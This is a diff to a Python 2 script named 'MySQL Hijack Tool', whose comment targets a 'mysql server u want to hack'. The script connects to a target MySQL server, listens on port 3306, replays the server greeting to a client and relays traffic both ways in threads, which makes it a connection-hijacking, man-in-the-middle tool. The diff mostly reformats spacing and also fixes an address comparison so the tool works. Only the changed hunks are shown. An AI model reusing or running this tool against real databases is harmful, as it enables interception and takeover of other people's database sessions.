@@ -5,22 +5,22 @@ import sys
 HOST = '0.0.0.0'
 PORT = 3306
 BUFSIZ = 4096000
-ADDR = (HOST,PORT)
+ADDR = (HOST, PORT)
 
-FORWARDHOST = '10.0.0.1' # target mysql server u want to hack
+FORWARDHOST = '10.0.0.1'  # target mysql server u want to hack
 FORWARDPORT = 3306
-FORWARDADDR = (FORWARDHOST,FORWARDPORT)
+FORWARDADDR = (FORWARDHOST, FORWARDPORT)
 
 FAKE_SOCKS5_HOST = '127.0.0.1'
 SERVERGREETINGPACKET = ''
 
 print 'MySQL Hijack Tool'
 print 'Connecting to forward host'
-tcpServerSock = socket(AF_INET,SOCK_STREAM)
+tcpServerSock = socket(AF_INET, SOCK_STREAM)
 tcpServerSock.connect(FORWARDADDR)
 print 'Forward host connected'
 
-tcpSerSock = socket(AF_INET,SOCK_STREAM)
+tcpSerSock = socket(AF_INET, SOCK_STREAM)
 tcpSerSock.bind(ADDR)
 tcpSerSock.listen(5)
 
@@ -55,9 +55,9 @@ tcpCliSock.close()
 print '--> Waiting new client connection'
 tcpCliSock, addr = tcpSerSock.accept()
 while True:
-    if addr != FAKE_SOCKS5_HOST:
+    if addr[0] != FAKE_SOCKS5_HOST:
         break
-print 'New Client connected',addr
+print 'New Client connected', addr
 
 print 'Step 0x04: Duplicating Server Greeting'
 tcpCliSock.send(SERVERGREETINGPACKET)
@@ -75,12 +75,13 @@ print '==================== WIN ===================='
 print '==================== WIN ===================='
 print '==================== WIN ===================='
 
+
 class ClientThread(threading.Thread):
     def __init__(self, clientSocket, serverServerSocket):
         threading.Thread.__init__(self)
         self.clientSocket = clientSocket
         self.serverServerSocket = serverServerSocket
-    
+
     def run(self):
         while True:
             data = self.clientSocket.recv(BUFSIZ)
@@ -93,12 +94,13 @@ class ClientThread(threading.Thread):
                 break
             self.serverServerSocket.send(data)
 
+
 class ServerThread(threading.Thread):
     def __init__(self, clientSocket, serverServerSocket):
         threading.Thread.__init__(self)
         self.clientSocket = clientSocket
         self.serverServerSocket = serverServerSocket
-    
+
     def run(self):
         while True:
             data = self.serverServerSocket.recv(BUFSIZ)
@@ -110,6 +112,7 @@ class ServerThread(threading.Thread):
                     pass
                 break
             self.clientSocket.send(data)
+
 
 print 'Starting Server thread and Client Thread'
 ct = ClientThread(tcpCliSock, tcpServerSock)
